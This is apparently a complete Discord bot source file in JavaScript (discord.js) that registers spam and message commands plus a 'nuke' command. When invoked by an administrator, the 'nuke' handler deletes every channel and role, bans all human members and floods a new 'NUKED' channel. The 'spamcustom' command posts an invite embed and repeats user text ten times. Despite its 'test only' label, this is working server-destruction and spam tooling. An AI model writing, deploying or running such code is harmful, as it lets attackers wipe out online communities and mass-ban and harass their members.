const { Client, GatewayIntentBits, SlashCommandBuilder, Routes, REST, EmbedBuilder } = require("discord.js");

const TOKEN = process.env.DISCORD_TOKEN || "YOUR_BOT_TOKEN";
const CLIENT_ID = process.env.CLIENT_ID || "YOUR_CLIENT_ID";

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

// Cooldown map
const cooldowns = new Map();
const COOLDOWN_TIME = 4000; // 4 seconds for normal commands

const COLOR_MAP = {
  red: 0xff0000,
  blue: 0x0064ff,
  green: 0x00c800,
  yellow: 0xffff00,
  purple: 0xa000ff,
  orange: 0xffa500
};

const INVITE_LINK = "https://your-discord-invite-link";

// Slash commands
const commands = [
  new SlashCommandBuilder()
    .setName("spamcustom")
    .setDescription("Spam a custom message")
    .addStringOption(opt =>
      opt.setName("text").setDescription("Message").setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName("sendembed")
    .setDescription("Send an embed")
    .addStringOption(opt =>
      opt.setName("title").setDescription("Title").setRequired(true)
    )
    .addStringOption(opt =>
      opt.setName("message").setDescription("Message").setRequired(true)
    )
    .addStringOption(opt =>
      opt.setName("color")
        .setDescription("Embed color")
        .setRequired(true)
        .addChoices(
          { name: "Red", value: "red" },
          { name: "Blue", value: "blue" },
          { name: "Green", value: "green" },
          { name: "Yellow", value: "yellow" },
          { name: "Purple", value: "purple" },
          { name: "Orange", value: "orange" }
        )
    ),

  new SlashCommandBuilder()
    .setName("sendmessage")
    .setDescription("Send a message")
    .addStringOption(opt =>
      opt.setName("message").setDescription("Message").setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName("nuke")
    .setDescription("⚠️ Destructively nukes the server! Test only.")
    .addStringOption(opt =>
      opt.setName("spam_message")
        .setDescription("Message to spam in channels")
        .setRequired(true)
    )
];

// Register slash commands
const rest = new REST({ version: "10" }).setToken(TOKEN);
(async () => {
  try {
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log("✅ Slash commands registered!");
  } catch (err) {
    console.error(err);
  }
})();

// Bot ready
client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}`);
});

// Command handler
client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return;
  const userId = interaction.user.id;
  const now = Date.now();

  // Cooldown
  const lastUsed = cooldowns.get(userId) || 0;
  if (now - lastUsed < COOLDOWN_TIME) {
    return interaction.reply({
      content: `⏱ Please wait ${(COOLDOWN_TIME - (now - lastUsed)) / 1000}s before using another command.`,
      ephemeral: true
    });
  }
  cooldowns.set(userId, now);

  // ----------------------- SPAMCUSTOM -----------------------
  if (interaction.commandName === "spamcustom") {
    const text = interaction.options.getString("text");
    await interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setTitle("Join Our Discord!")
          .setDescription(`[Click here](${INVITE_LINK})`)
          .setColor(0xff0000)
      ],
      ephemeral: true
    });

    for (let i = 0; i < 10; i++) {
      await new Promise(r => setTimeout(r, 150));
      await interaction.followUp({ content: text });
    }
  }

  // ----------------------- SENDEMBED -----------------------
  if (interaction.commandName === "sendembed") {
    const title = interaction.options.getString("title");
    const message = interaction.options.getString("message");
    const color = interaction.options.getString("color");

    await interaction.reply({ content: "Embed sent.", ephemeral: true });

    const embed = new EmbedBuilder()
      .setTitle(title)
      .setDescription(message.replace(/\\n/g, "\n"))
      .setColor(COLOR_MAP[color] || 0xffffff);

    await interaction.followUp({ embeds: [embed] });
  }

  // ----------------------- SENDMESSAGE -----------------------
  if (interaction.commandName === "sendmessage") {
    const message = interaction.options.getString("message");
    await interaction.reply({ content: "Message sent.", ephemeral: true });
    await interaction.followUp({ content: message.replace(/\\n/g, "\n") });
  }

  // ----------------------- NUKE -----------------------
  if (interaction.commandName === "nuke") {
    if (!interaction.member.permissions.has("Administrator")) {
      return interaction.reply({ content: "❌ You must be an Administrator to use this command.", ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    const spamMessage = interaction.options.getString("spam_message");
    const guild = interaction.guild;

    // Delete all channels
    for (const channel of guild.channels.cache.values()) {
      try { await channel.delete(); } catch (err) { console.log(`Failed to delete channel ${channel.name}: ${err}`); }
    }

    // Delete all roles
    for (const role of guild.roles.cache.values()) {
      try { if (!role.managed && role.id !== guild.id) await role.delete(); } 
      catch (err) { console.log(`Failed to delete role ${role.name}: ${err}`); }
    }

    // Ban all members except bots
    for (const member of guild.members.cache.values()) {
      try { if (!member.user.bot) await member.ban({ reason: "Server nuked" }); } 
      catch (err) { console.log(`Failed to ban member ${member.user.tag}: ${err}`); }
    }

    // Spam a new channel
    const newChannel = await guild.channels.create({ name: "NUKED", type: 0 }); // 0 = text
    for (let i = 0; i < 10; i++) await newChannel.send(spamMessage);

    await interaction.editReply({ content: "✅ Server nuked (test only!)." });
  }
});

client.login(TOKEN);
